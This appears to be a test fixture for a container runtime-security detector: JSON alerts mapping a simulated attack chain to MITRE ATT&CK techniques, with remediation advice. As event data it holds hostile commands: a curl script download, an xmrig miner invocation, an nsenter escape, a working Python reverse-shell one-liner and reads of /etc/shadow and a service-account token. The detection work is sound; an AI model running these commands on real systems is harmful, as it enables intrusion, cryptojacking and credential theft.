@@ -1,0 +1,628 @@
+[
+  {
+    "rule_id": "DS-RAT-RT-001",
+    "severity": "HIGH",
+    "title": "Interactive shell spawned in container",
+    "message": "shell /bin/sh (pid 812) spawned by /usr/sbin/nginx with an attached tty (interactive)",
+    "technique": {
+      "ID": "T1059.004",
+      "Name": "Command and Scripting Interpreter: Unix Shell",
+      "Tactic": "Execution",
+      "URL": "https://attack.mitre.org/techniques/T1059/004/"
+    },
+    "seq": 2,
+    "time_unix_nano": 2000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2",
+      "runtime": "containerd"
+    },
+    "process": {
+      "pid": 812,
+      "ppid": 1,
+      "comm": "sh",
+      "exe": "/bin/sh",
+      "ancestry": [
+        "/pause",
+        "/usr/sbin/nginx",
+        "/bin/sh"
+      ],
+      "tty": true
+    },
+    "remediation": "Investigate the parent process and session. Use distroless/no-shell images, and restrict `exec` into production pods via RBAC. If unexpected, isolate the container and rotate any credentials it could reach.",
+    "metadata": {
+      "ancestry": "/pause -\u003e /usr/sbin/nginx -\u003e /bin/sh",
+      "parent": "/usr/sbin/nginx",
+      "shell": "sh",
+      "tty": "true"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-002",
+    "severity": "HIGH",
+    "title": "Binary not present in image executed (drift)",
+    "message": "executable /usr/bin/curl (pid 900) is not part of image registry.example.com/web:1.4.2",
+    "technique": {
+      "ID": "T1105",
+      "Name": "Ingress Tool Transfer",
+      "Tactic": "Command and Control",
+      "URL": "https://attack.mitre.org/techniques/T1105/"
+    },
+    "seq": 3,
+    "time_unix_nano": 3000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 900,
+      "ppid": 812,
+      "comm": "curl",
+      "exe": "/usr/bin/curl",
+      "args": [
+        "curl",
+        "-sL",
+        "http://203.0.113.9/x.sh"
+      ],
+      "ancestry": [
+        "/pause",
+        "/usr/sbin/nginx",
+        "/bin/sh",
+        "/usr/bin/curl"
+      ]
+    },
+    "remediation": "Treat the container as compromised: capture forensics, isolate it, and redeploy from a trusted image. Enforce a read-only root filesystem and drop write access to executable paths.",
+    "metadata": {
+      "drifted_binary": "/usr/bin/curl",
+      "image": "registry.example.com/web:1.4.2"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-002",
+    "severity": "HIGH",
+    "title": "Binary not present in image executed (drift)",
+    "message": "executable /usr/local/bin/xmrig (pid 901) is not part of image registry.example.com/web:1.4.2",
+    "technique": {
+      "ID": "T1105",
+      "Name": "Ingress Tool Transfer",
+      "Tactic": "Command and Control",
+      "URL": "https://attack.mitre.org/techniques/T1105/"
+    },
+    "seq": 4,
+    "time_unix_nano": 4000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 901,
+      "ppid": 812,
+      "comm": "xmrig",
+      "exe": "/usr/local/bin/xmrig",
+      "args": [
+        "xmrig",
+        "-o",
+        "stratum+tcp://pool.minexmr.com:4444",
+        "--donate-level",
+        "1"
+      ],
+      "ancestry": [
+        "/pause",
+        "/usr/sbin/nginx",
+        "/bin/sh",
+        "/usr/local/bin/xmrig"
+      ]
+    },
+    "remediation": "Treat the container as compromised: capture forensics, isolate it, and redeploy from a trusted image. Enforce a read-only root filesystem and drop write access to executable paths.",
+    "metadata": {
+      "drifted_binary": "/usr/local/bin/xmrig",
+      "image": "registry.example.com/web:1.4.2"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-006",
+    "severity": "HIGH",
+    "title": "Crypto-mining activity detected",
+    "message": "crypto-miner indicator: miner binary xmrig (pid 901)",
+    "technique": {
+      "ID": "T1496",
+      "Name": "Resource Hijacking",
+      "Tactic": "Impact",
+      "URL": "https://attack.mitre.org/techniques/T1496/"
+    },
+    "seq": 4,
+    "time_unix_nano": 4000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 901,
+      "ppid": 812,
+      "comm": "xmrig",
+      "exe": "/usr/local/bin/xmrig",
+      "args": [
+        "xmrig",
+        "-o",
+        "stratum+tcp://pool.minexmr.com:4444",
+        "--donate-level",
+        "1"
+      ],
+      "ancestry": [
+        "/pause",
+        "/usr/sbin/nginx",
+        "/bin/sh",
+        "/usr/local/bin/xmrig"
+      ]
+    },
+    "remediation": "Kill the process and isolate the workload. Investigate the initial-access vector (exposed service, leaked credentials). Apply CPU limits and egress controls to pools.",
+    "metadata": {
+      "exe": "/usr/local/bin/xmrig",
+      "signal": "miner binary xmrig"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-003",
+    "severity": "CRITICAL",
+    "title": "Container escape attempt",
+    "message": "namespace/mount escape syscall: mount (source=/dev/sda1, target=/mnt/host, fstype=ext4)",
+    "technique": {
+      "ID": "T1611",
+      "Name": "Escape to Host",
+      "Tactic": "Privilege Escalation",
+      "URL": "https://attack.mitre.org/techniques/T1611/"
+    },
+    "seq": 5,
+    "time_unix_nano": 5000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 902,
+      "ppid": 812,
+      "comm": "mount",
+      "exe": "/bin/mount"
+    },
+    "remediation": "Assume host compromise. Cordon and investigate the node. Remove privileged/hostPath mounts and the container runtime socket from workloads; drop CAP_SYS_ADMIN; enforce a restricted seccomp profile.",
+    "metadata": {
+      "fstype": "ext4",
+      "source": "/dev/sda1",
+      "syscall": "mount",
+      "target": "/mnt/host"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-003",
+    "severity": "CRITICAL",
+    "title": "Container escape attempt",
+    "message": "container-escape tool executed: nsenter (pid 903)",
+    "technique": {
+      "ID": "T1611",
+      "Name": "Escape to Host",
+      "Tactic": "Privilege Escalation",
+      "URL": "https://attack.mitre.org/techniques/T1611/"
+    },
+    "seq": 6,
+    "time_unix_nano": 6000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 903,
+      "ppid": 812,
+      "comm": "nsenter",
+      "exe": "/usr/bin/nsenter",
+      "args": [
+        "nsenter",
+        "-t",
+        "1",
+        "-m",
+        "-u",
+        "-i",
+        "-n",
+        "-p"
+      ],
+      "ancestry": [
+        "/pause",
+        "/usr/sbin/nginx",
+        "/bin/sh",
+        "/usr/bin/nsenter"
+      ]
+    },
+    "remediation": "Assume host compromise. Cordon and investigate the node. Remove privileged/hostPath mounts and the container runtime socket from workloads; drop CAP_SYS_ADMIN; enforce a restricted seccomp profile.",
+    "metadata": {
+      "exe": "/usr/bin/nsenter",
+      "tool": "nsenter"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-004",
+    "severity": "MEDIUM",
+    "title": "Sensitive file access",
+    "message": "access to sensitive file /etc/shadow (read)",
+    "technique": {
+      "ID": "T1552",
+      "Name": "Unsecured Credentials",
+      "Tactic": "Credential Access",
+      "URL": "https://attack.mitre.org/techniques/T1552/"
+    },
+    "seq": 7,
+    "time_unix_nano": 7000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 812,
+      "comm": "sh",
+      "exe": "/bin/sh"
+    },
+    "remediation": "Enforce a read-only root filesystem and least-privilege file permissions. Alert on and investigate any write to system-critical paths; validate against expected configuration management.",
+    "metadata": {
+      "access": "read",
+      "matched": "/etc/shadow",
+      "op": "read",
+      "path": "/etc/shadow"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-004",
+    "severity": "HIGH",
+    "title": "Sensitive file access",
+    "message": "write to security-critical file /etc/passwd (write)",
+    "technique": {
+      "ID": "T1552",
+      "Name": "Unsecured Credentials",
+      "Tactic": "Credential Access",
+      "URL": "https://attack.mitre.org/techniques/T1552/"
+    },
+    "seq": 8,
+    "time_unix_nano": 8000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 812,
+      "comm": "sh",
+      "exe": "/bin/sh"
+    },
+    "remediation": "Enforce a read-only root filesystem and least-privilege file permissions. Alert on and investigate any write to system-critical paths; validate against expected configuration management.",
+    "metadata": {
+      "access": "write",
+      "matched": "/etc/passwd",
+      "op": "write",
+      "path": "/etc/passwd"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-005",
+    "severity": "HIGH",
+    "title": "Credential / token theft",
+    "message": "access to credential store /var/run/secrets/kubernetes.io/serviceaccount/token",
+    "technique": {
+      "ID": "T1528",
+      "Name": "Steal Application Access Token",
+      "Tactic": "Credential Access",
+      "URL": "https://attack.mitre.org/techniques/T1528/"
+    },
+    "seq": 9,
+    "time_unix_nano": 9000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 904,
+      "ppid": 812,
+      "comm": "cat",
+      "exe": "/bin/cat"
+    },
+    "remediation": "Enforce IMDSv2 with a hop limit of 1 and block IMDS egress from pods that do not need it. Mount SA tokens only where required (`automountServiceAccountToken: false`). Rotate any token that may have been exposed.",
+    "references": [
+      "https://attack.mitre.org/techniques/T1528/"
+    ],
+    "metadata": {
+      "matched": "/var/run/secrets/kubernetes.io/serviceaccount/token",
+      "op": "read",
+      "path": "/var/run/secrets/kubernetes.io/serviceaccount/token",
+      "vector": "file"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-005",
+    "severity": "HIGH",
+    "title": "Credential / token theft",
+    "message": "connection to cloud metadata service (169.254.169.254:80) — possible credential theft",
+    "technique": {
+      "ID": "T1552.005",
+      "Name": "Unsecured Credentials: Cloud Instance Metadata API",
+      "Tactic": "Credential Access",
+      "URL": "https://attack.mitre.org/techniques/T1552/005/"
+    },
+    "seq": 10,
+    "time_unix_nano": 10000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 904,
+      "comm": "cat",
+      "exe": "/bin/cat"
+    },
+    "remediation": "Enforce IMDSv2 with a hop limit of 1 and block IMDS egress from pods that do not need it. Mount SA tokens only where required (`automountServiceAccountToken: false`). Rotate any token that may have been exposed.",
+    "metadata": {
+      "endpoint": "169.254.169.254:80",
+      "vector": "imds"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-007",
+    "severity": "MEDIUM",
+    "title": "Suspicious network egress (possible C2/exfiltration)",
+    "message": "egress to suspicious port 4444 (203.0.113.5:4444)",
+    "technique": {
+      "ID": "T1071",
+      "Name": "Application Layer Protocol",
+      "Tactic": "Command and Control",
+      "URL": "https://attack.mitre.org/techniques/T1071/"
+    },
+    "seq": 11,
+    "time_unix_nano": 11000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 901,
+      "comm": "xmrig",
+      "exe": "/usr/local/bin/xmrig"
+    },
+    "remediation": "Apply default-deny egress NetworkPolicies and allowlist only required destinations. Investigate the destination reputation. Correlate with process drift (DS-RAT-RT-002) to confirm an implant.",
+    "metadata": {
+      "endpoint": "203.0.113.5:4444",
+      "reason": "suspicious-port"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-008",
+    "severity": "CRITICAL",
+    "title": "Kernel abuse: rootkit / eBPF / module load",
+    "message": "kernel module operation from container: init_module",
+    "technique": {
+      "ID": "T1547.006",
+      "Name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
+      "Tactic": "Persistence",
+      "URL": "https://attack.mitre.org/techniques/T1547/006/"
+    },
+    "seq": 12,
+    "time_unix_nano": 12000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 905,
+      "ppid": 812,
+      "comm": "insmod",
+      "exe": "/sbin/insmod",
+      "caps": [
+        "CAP_SYS_MODULE"
+      ]
+    },
+    "remediation": "Drop CAP_SYS_MODULE and CAP_BPF from all workloads; set kernel.modules_disabled=1 on hardened nodes. No application container should load modules or eBPF — treat this as a critical incident and forensically image the node.",
+    "metadata": {
+      "module": "rootkit.ko",
+      "syscall": "init_module",
+      "vector": "lkm"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-008",
+    "severity": "CRITICAL",
+    "title": "Kernel abuse: rootkit / eBPF / module load",
+    "message": "eBPF syscall from container (cmd=BPF_PROG_LOAD) — possible eBPF-based rootkit or sensor evasion",
+    "technique": {
+      "ID": "T1547.006",
+      "Name": "Boot or Logon Autostart Execution: Kernel Modules and Extensions",
+      "Tactic": "Persistence",
+      "URL": "https://attack.mitre.org/techniques/T1547/006/"
+    },
+    "seq": 13,
+    "time_unix_nano": 13000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 906,
+      "ppid": 812,
+      "comm": "loader",
+      "exe": "/tmp/loader"
+    },
+    "remediation": "Drop CAP_SYS_MODULE and CAP_BPF from all workloads; set kernel.modules_disabled=1 on hardened nodes. No application container should load modules or eBPF — treat this as a critical incident and forensically image the node.",
+    "metadata": {
+      "cmd": "BPF_PROG_LOAD",
+      "syscall": "bpf",
+      "vector": "ebpf"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-008",
+    "severity": "CRITICAL",
+    "title": "Kernel abuse: rootkit / eBPF / module load",
+    "message": "access to kernel interface /proc/kallsyms (kernel symbol/probe interface)",
+    "technique": {
+      "ID": "T1014",
+      "Name": "Rootkit",
+      "Tactic": "Defense Evasion",
+      "URL": "https://attack.mitre.org/techniques/T1014/"
+    },
+    "seq": 14,
+    "time_unix_nano": 14000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 906,
+      "comm": "loader",
+      "exe": "/tmp/loader"
+    },
+    "remediation": "Drop CAP_SYS_MODULE and CAP_BPF from all workloads; set kernel.modules_disabled=1 on hardened nodes. No application container should load modules or eBPF — treat this as a critical incident and forensically image the node.",
+    "references": [
+      "https://attack.mitre.org/techniques/T1014/"
+    ],
+    "metadata": {
+      "path": "/proc/kallsyms",
+      "reason": "kernel symbol/probe interface",
+      "vector": "kernel-iface"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-010",
+    "severity": "CRITICAL",
+    "title": "Reverse/bind shell detected",
+    "message": "reverse shell payload in args: socket.socket (pid 907)",
+    "technique": {
+      "ID": "T1071",
+      "Name": "Application Layer Protocol",
+      "Tactic": "Command and Control",
+      "URL": "https://attack.mitre.org/techniques/T1071/"
+    },
+    "seq": 15,
+    "time_unix_nano": 15000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 907,
+      "ppid": 1,
+      "comm": "python3",
+      "exe": "/usr/bin/python3",
+      "args": [
+        "python3",
+        "-c",
+        "import socket,os,pty;s=socket.socket();s.connect(('203.0.113.5',9001));os.dup2(s.fileno(),0);pty.spawn('/bin/sh')"
+      ],
+      "ancestry": [
+        "/pause",
+        "/usr/sbin/nginx",
+        "/usr/bin/python3"
+      ],
+      "stdio_socket": true
+    },
+    "remediation": "Isolate the container immediately and capture a forensic bundle. Identify the remote endpoint and block it. Rotate all credentials reachable from the workload.",
+    "metadata": {
+      "exe": "/usr/bin/python3",
+      "signal": "socket.socket"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-009",
+    "severity": "HIGH",
+    "title": "Privilege escalation attempt",
+    "message": "privilege-escalation tool executed: sudo (pid 908)",
+    "technique": {
+      "ID": "T1548",
+      "Name": "Abuse Elevation Control Mechanism",
+      "Tactic": "Privilege Escalation",
+      "URL": "https://attack.mitre.org/techniques/T1548/"
+    },
+    "seq": 16,
+    "time_unix_nano": 16000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 908,
+      "ppid": 812,
+      "comm": "sudo",
+      "exe": "/usr/bin/sudo",
+      "args": [
+        "sudo",
+        "-u",
+        "root",
+        "id"
+      ],
+      "ancestry": [
+        "/pause",
+        "/usr/sbin/nginx",
+        "/bin/sh",
+        "/usr/bin/sudo"
+      ]
+    },
+    "remediation": "Run as non-root with `allowPrivilegeEscalation: false` and `no_new_privs`. Drop all capabilities and add back only what is required. Remove setuid binaries from images.",
+    "metadata": {
+      "tool": "sudo",
+      "uid": "0"
+    }
+  },
+  {
+    "rule_id": "DS-RAT-RT-009",
+    "severity": "HIGH",
+    "title": "Privilege escalation attempt",
+    "message": "setuid/setgid bit set on /tmp/rootbash",
+    "technique": {
+      "ID": "T1548",
+      "Name": "Abuse Elevation Control Mechanism",
+      "Tactic": "Privilege Escalation",
+      "URL": "https://attack.mitre.org/techniques/T1548/"
+    },
+    "seq": 17,
+    "time_unix_nano": 17000,
+    "container": {
+      "id": "c-web-1",
+      "name": "web",
+      "image_id": "sha256:web",
+      "image_ref": "registry.example.com/web:1.4.2"
+    },
+    "process": {
+      "pid": 908,
+      "comm": "sudo",
+      "exe": "/usr/bin/sudo"
+    },
+    "remediation": "Run as non-root with `allowPrivilegeEscalation: false` and `no_new_privs`. Drop all capabilities and add back only what is required. Remove setuid binaries from images.",
+    "metadata": {
+      "mode": "04755",
+      "path": "/tmp/rootbash"
+    }
+  }
+]
